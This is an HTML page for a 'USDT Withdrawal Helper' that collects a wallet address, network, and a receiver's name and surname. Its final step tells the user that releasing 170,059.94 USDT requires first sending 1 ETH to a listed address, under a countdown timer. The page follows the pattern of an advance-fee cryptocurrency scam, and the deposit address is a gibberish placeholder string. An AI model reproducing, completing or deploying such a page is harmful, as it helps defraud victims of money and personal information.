<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>USDT Withdrawal Helper</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="container">
    <div class="box" id="step1">
      <h2>Withdraw Setup</h2>
      <label>Withdrawal Address</label>
      <input type="text" id="withdrawalAddress" placeholder="e.g. 0xABC123...">
      <label>Choose Your Network</label>
      <select id="network">
        <option value="">-- Select Network --</option>
        <option value="Ethereum">Ethereum</option>
        <option value="Binance Smart Chain">Binance Smart Chain</option>
        <option value="Tron">Tron</option>
        <option value="Polygon">Polygon</option>
      </select>
      <button onclick="confirmStep1()">Continue</button>
    </div>

    <div class="box" id="step2" style="display:none;">
      <h2>Receiver Information</h2>
      <label>Receiver Address</label>
      <input type="text" id="receiverAddress" placeholder="e.g. 0xReceiver...">
      <label>Name</label>
      <input type="text" id="receiverName" placeholder="First Name">
      <label>Surname</label>
      <input type="text" id="receiverSurname" placeholder="Last Name">
      <button onclick="confirmStep2()">Continue</button>
    </div>

    <div class="box" id="step3" style="display:none;">
      <h2>Final Step</h2>
      <p><strong>To withdraw 170,059.94 USDT:</strong></p>
      <p>Send <strong>1 ETH</strong> to the following network:</p>
      <p><strong>Network:</strong> <span id="finalNetwork"></span></p>
      <p><strong>Address:</strong> <span class="highlight">gduygfsyugfgefuishofseohfosh</span></p>
      <div id="timer">Waiting... 59:00</div>
    </div>
  </div>

  <script src="script.js"></script>
</body>
</html>
